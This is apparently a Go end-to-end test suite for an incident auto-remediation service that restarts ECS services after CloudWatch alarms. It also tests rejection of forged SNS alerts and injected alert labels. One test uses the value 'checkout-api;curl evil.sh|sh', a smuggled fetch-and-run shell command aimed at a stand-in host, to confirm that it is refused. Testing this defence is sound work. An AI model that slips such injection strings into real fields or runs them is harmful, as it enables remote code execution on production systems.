// Package e2e runs the walking skeleton end to end: a CloudWatch alarm
// arrives through SNS, an incident opens, the ecs-service-restart runbook runs
// on a real agent over mutual TLS against a simulated ECS, and the incident
// either auto-resolves without paging or pages when the fix doesn't work.
package e2e

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/peacedouts/nightfix/internal/agent"
	"github.com/peacedouts/nightfix/internal/agent/awscall"
	"github.com/peacedouts/nightfix/internal/auth0"
	"github.com/peacedouts/nightfix/internal/auth0/auth0test"
	"github.com/peacedouts/nightfix/internal/controlplane"
	"github.com/peacedouts/nightfix/internal/devstub"
	"github.com/peacedouts/nightfix/internal/ids"
	"github.com/peacedouts/nightfix/internal/signing"
	"github.com/peacedouts/nightfix/internal/testdb"
)

const topic = "arn:aws:sns:us-east-1:123456789012:nightfix-alarms"

type env struct {
	t      *testing.T
	ctx    context.Context
	api    string
	key    string
	stub   *devstub.Stub
	ingest string
	orgID  string // org_…
	gwURL  string
	caPEM  []byte
	auth0  *auth0test.Issuer
	aws    *awscall.Client
}

const (
	awsAccount = "123456789012"
	agentRole  = "nightfix-agent"
)

func setup(t *testing.T, runbookYAML string) *env {
	t.Helper()
	pool := testdb.New(t)
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)

	log := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelWarn}))
	mk := make([]byte, 32)
	rand.Read(mk)
	sealer, _ := signing.NewSealer(mk)
	ca, err := controlplane.LoadOrCreateCA(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}

	stub := devstub.New(3 * time.Second)
	stubSrv := httptest.NewServer(stub.Handler())
	t.Cleanup(stubSrv.Close)
	stub.BaseURL = stubSrv.URL

	idp := auth0test.New(t)
	var srv *controlplane.Server
	ingestSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { srv.IngestHandler().ServeHTTP(w, r) }))
	t.Cleanup(ingestSrv.Close)
	srv = controlplane.New(pool, sealer, ca, controlplane.Config{
		PublicIngestURL:    ingestSrv.URL,
		SNSCertURLPrefixes: []string{stubSrv.URL + "/sns/"},
		PollWait:           2 * time.Second,
		STSEndpoint:        stubSrv.URL + "/sts/",
		Auth0: controlplane.Auth0Config{Verifier: &auth0.Verifier{
			Issuer: idp.Issuer, Audience: idp.Audience, JWKSURL: idp.Srv.URL}},
	}, log)
	apiSrv := httptest.NewServer(srv.APIHandler())
	t.Cleanup(apiSrv.Close)
	gw := httptest.NewUnstartedServer(srv.AgentHandler())
	tlsCfg, err := ca.ServerTLS([]string{"127.0.0.1"})
	if err != nil {
		t.Fatal(err)
	}
	gw.TLS = tlsCfg
	gw.StartTLS()
	t.Cleanup(gw.Close)
	srv.RunWorkers(ctx, 100*time.Millisecond)

	org, err := srv.CreateOrg(ctx, "Acme", "acme")
	if err != nil {
		t.Fatal(err)
	}
	e := &env{t: t, ctx: ctx, api: apiSrv.URL, key: org.APIKey, stub: stub, orgID: ids.Encode("org", org.OrgID),
		gwURL: gw.URL, caPEM: ca.CertPEM, auth0: idp}

	e.call("POST", "/v1/services", map[string]any{"name": "checkout-api", "max_hold": "1m", "verification_window": "20s"}, nil)
	e.call("POST", "/v1/services/checkout-api/escalation-targets", map[string]any{"type": "slack", "url": stubSrv.URL + "/slack"}, nil)
	e.call("POST", "/v1/services/checkout-api/escalation-targets",
		map[string]any{"type": "pagerduty", "routing_key": "pd-routing-key", "events_url": stubSrv.URL + "/pagerduty"}, nil)
	var integ map[string]string
	e.call("POST", "/v1/integrations", map[string]any{"type": "cloudwatch", "name": "prod alarms",
		"default_service": "checkout-api", "topic_arn": topic}, &integ)
	e.ingest = integ["ingest_url"]

	var pub map[string]any
	e.callRaw("PUT", "/v1/runbooks/ecs-service-restart", []byte(runbookYAML), &pub)
	if pub["version"] != float64(1) {
		t.Fatalf("publish: %v", pub)
	}

	// IAM enrollment (the default): the agent's role, not a token, is what
	// gets it in. Labels come from this rule.
	e.call("POST", "/v1/enrollment-rules", map[string]any{"method": "iam",
		"role_arn": "arn:aws:iam::" + awsAccount + ":role/platform/" + agentRole,
		"labels":   map[string]string{"env": "prod"}, "max_agents": 1}, nil)
	stub.AddIAMIdentity(devstub.IAMIdentity{AccessKey: "AKIDEXAMPLE", Secret: "wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY",
		Account: awsAccount, Role: agentRole})

	// The agent uses the real SigV4 AWS client, pointed at the simulated ECS and STS.
	t.Setenv("NIGHTFIX_AWS_ENDPOINT_URL", stubSrv.URL+"/aws")
	t.Setenv("NIGHTFIX_STS_ENDPOINT_URL", stubSrv.URL+"/sts/")
	t.Setenv("AWS_ACCESS_KEY_ID", "AKIDEXAMPLE")
	t.Setenv("AWS_SECRET_ACCESS_KEY", "wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY")
	t.Setenv("AWS_REGION", "us-east-1")
	t.Setenv("AWS_EC2_METADATA_DISABLED", "true")
	aws, err := awscall.New(ctx)
	if err != nil {
		t.Fatal(err)
	}
	e.aws = aws
	ag, err := agent.New(agent.Config{Endpoint: gw.URL, CAPEM: ca.CertPEM, EnrollMethod: "iam", OrgID: e.orgID, IAM: aws,
		StateDir: t.TempDir(), AWS: aws, Log: log})
	if err != nil {
		t.Fatal(err)
	}
	go ag.Run(ctx)
	e.waitFor("agent online", 15*time.Second, func() bool {
		var agents []map[string]any
		e.call("GET", "/v1/agents", nil, &agents)
		return len(agents) == 1 && agents[0]["status"] == "online"
	})
	stub.AddService("prod-east", "checkout-api")
	return e
}

func (e *env) callRaw(method, path string, body []byte, out any) int {
	e.t.Helper()
	req, _ := http.NewRequest(method, e.api+path, bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+e.key)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	if resp.StatusCode/100 != 2 {
		e.t.Fatalf("%s %s: %d %s", method, path, resp.StatusCode, b)
	}
	if out != nil {
		if err := json.Unmarshal(b, out); err != nil {
			e.t.Fatalf("%s %s: %v: %s", method, path, err, b)
		}
	}
	return resp.StatusCode
}

func (e *env) call(method, path string, body, out any) {
	e.t.Helper()
	var b []byte
	if body != nil {
		b, _ = json.Marshal(body)
	}
	e.callRaw(method, path, b, out)
}

func (e *env) waitFor(what string, timeout time.Duration, cond func() bool) {
	e.t.Helper()
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if cond() {
			return
		}
		time.Sleep(200 * time.Millisecond)
	}
	e.dumpTimeline()
	e.t.Fatalf("timed out waiting for %s", what)
}

func (e *env) incident(n int) map[string]any {
	var inc map[string]any
	req, _ := http.NewRequest("GET", fmt.Sprintf("%s/v1/incidents/%d", e.api, n), nil)
	req.Header.Set("Authorization", "Bearer "+e.key)
	resp, err := http.DefaultClient.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return nil
	}
	defer resp.Body.Close()
	json.NewDecoder(resp.Body).Decode(&inc)
	return inc
}

func (e *env) timeline(n int) []string {
	var tl []map[string]any
	e.call("GET", fmt.Sprintf("/v1/incidents/%d/timeline", n), nil, &tl)
	var out []string
	for _, x := range tl {
		out = append(out, fmt.Sprint(x["type"], ": ", x["message"]))
	}
	return out
}

func (e *env) dumpTimeline() {
	if e.incident(1) == nil {
		return
	}
	for _, l := range e.timeline(1) {
		e.t.Log("  " + l)
	}
}

func (e *env) alarm(state, service string) {
	e.t.Helper()
	code, err := e.stub.Publish(e.ingest, topic, devstub.CloudWatchAlarm("ecs-unhealthy-checkout", state, "prod-east", service))
	if err != nil || code != http.StatusAccepted {
		e.t.Fatalf("publish %s: %d %v", state, code, err)
	}
}

func runbookYAML(t *testing.T, waitTimeout string) string {
	b, err := os.ReadFile("../../examples/runbooks/ecs-service-restart.yaml")
	if err != nil {
		t.Fatal(err)
	}
	return strings.Replace(string(b), "      timeout: 2m\n", "      timeout: "+waitTimeout+"\n", 1)
}

func status(inc map[string]any) string { return fmt.Sprint(inc["status"]) }

// The headline: an alarm auto-fixes itself and nobody is paged.
func TestAutoRemediatedWithoutPaging(t *testing.T) {
	e := setup(t, runbookYAML(t, "2m"))
	e.alarm("ALARM", "checkout-api")

	e.waitFor("incident remediating", 10*time.Second, func() bool {
		inc := e.incident(1)
		return inc != nil && status(inc) == "remediating"
	})
	var run map[string]any
	e.waitFor("run succeeded", 30*time.Second, func() bool {
		inc := e.incident(1)
		run = nil
		if id, ok := inc["remediation_run"].(string); ok {
			e.call("GET", "/v1/runs/"+id, nil, &run)
		}
		return run != nil && run["status"] == "succeeded"
	})
	// The fix worked; CloudWatch now reports OK.
	e.alarm("OK", "checkout-api")
	e.waitFor("incident auto-resolved", 10*time.Second, func() bool {
		inc := e.incident(1)
		return status(inc) == "resolved" && inc["resolution"] == "auto_remediated"
	})
	e.waitFor("slack summary", 5*time.Second, func() bool {
		_, slack, _ := e.stub.Snapshot()
		return len(slack) >= 2 && strings.Contains(slack[len(slack)-1], "auto-remediated")
	})

	calls, slack, pd := e.stub.Snapshot()
	if len(pd) != 0 {
		t.Fatalf("nobody should have been paged, but PagerDuty got %v", pd)
	}
	if !contains(calls, "ecs:UpdateService") {
		t.Fatalf("expected a forced deployment, AWS calls were %v", calls)
	}
	if !strings.Contains(slack[0], "Auto-remediation started") {
		t.Fatalf("first Slack message should announce the remediation: %q", slack[0])
	}
	e.call("GET", "/v1/runs/"+fmt.Sprint(e.incident(1)["remediation_run"]), nil, &run)
	if run["verified"] != true {
		t.Fatalf("run should be marked verified: %v", run)
	}
	for _, l := range e.timeline(1) {
		t.Log("  " + l)
	}
	var audit []map[string]any
	e.call("GET", "/v1/audit-events", nil, &audit) // also re-verifies the hash chain
	if len(audit) < 8 {
		t.Fatalf("expected a populated audit log, got %d events", len(audit))
	}
}

// When the fix doesn't work, the wait times out and on-call is paged; when
// the alarm later clears, the upstream page is resolved automatically.
func TestFailedRemediationPagesAndAutoResolvesUpstream(t *testing.T) {
	e := setup(t, runbookYAML(t, "6s"))
	e.stub.SetHeals(false)
	e.alarm("ALARM", "checkout-api")

	e.waitFor("page after failed remediation", 30*time.Second, func() bool {
		_, _, pd := e.stub.Snapshot()
		return len(pd) == 1
	})
	inc := e.incident(1)
	if status(inc) != "triggered" {
		t.Fatalf("incident should be triggered, got %v", inc)
	}
	_, _, pd := e.stub.Snapshot()
	if pd[0]["event_action"] != "trigger" || pd[0]["dedup_key"] != inc["id"] {
		t.Fatalf("unexpected page %v", pd[0])
	}
	details := pd[0]["payload"].(map[string]any)["custom_details"].(map[string]any)
	if !strings.Contains(fmt.Sprint(details["reason"]), "did not stabilize") {
		t.Fatalf("page should explain the failure, got %v", details["reason"])
	}

	e.alarm("OK", "checkout-api")
	e.waitFor("upstream page resolved", 10*time.Second, func() bool {
		_, _, pd := e.stub.Snapshot()
		return len(pd) == 2 && pd[1]["event_action"] == "resolve" && pd[1]["dedup_key"] == inc["id"]
	})
	if inc := e.incident(1); status(inc) != "resolved" || inc["resolution"] != "alerts_resolved" {
		t.Fatalf("incident should be resolved by the alert clearing: %v", inc)
	}
}

// Alert labels are attacker-influenceable: a malicious service name fails the
// parameter pattern, nothing runs, and a human is paged.
func TestInjectionInAlertLabelsIsRefused(t *testing.T) {
	e := setup(t, runbookYAML(t, "2m"))
	e.alarm("ALARM", "checkout-api;curl evil.sh|sh")
	e.waitFor("page", 15*time.Second, func() bool {
		_, _, pd := e.stub.Snapshot()
		return len(pd) == 1
	})
	calls, _, _ := e.stub.Snapshot()
	for _, c := range calls {
		if strings.HasPrefix(c, "ecs:") {
			t.Fatalf("no ECS call should have been made, got %v", calls)
		}
	}
	found := false
	for _, l := range e.timeline(1) {
		if strings.Contains(l, "does not match") {
			found = true
		}
	}
	if !found {
		t.Fatalf("timeline should explain the rejected parameter: %v", e.timeline(1))
	}
}

// Ingest verifies SNS signatures and the expected topic before storing anything.
func TestIngestRejectsForgedAlerts(t *testing.T) {
	e := setup(t, runbookYAML(t, "2m"))
	post := func(body []byte) int {
		resp, err := http.Post(e.ingest, "text/plain", bytes.NewReader(body))
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		return resp.StatusCode
	}
	alarm := devstub.CloudWatchAlarm("ecs-unhealthy-checkout", "ALARM", "prod-east", "checkout-api")

	// Tampered after signing.
	forged := bytes.Replace(e.stub.SNSEnvelope(topic, alarm), []byte("prod-east"), []byte("prod-west"), 1)
	if code := post(forged); code != http.StatusUnauthorized {
		t.Fatalf("tampered message: got %d, want 401", code)
	}
	// Validly signed, but from a topic this integration doesn't trust.
	if code := post(e.stub.SNSEnvelope("arn:aws:sns:us-east-1:999999999999:other", alarm)); code != http.StatusUnauthorized {
		t.Fatalf("wrong topic: got %d, want 401", code)
	}
	time.Sleep(time.Second)
	if e.incident(1) != nil {
		t.Fatal("a forged alert opened an incident")
	}
}

func contains(xs []string, x string) bool {
	for _, v := range xs {
		if v == x {
			return true
		}
	}
	return false
}
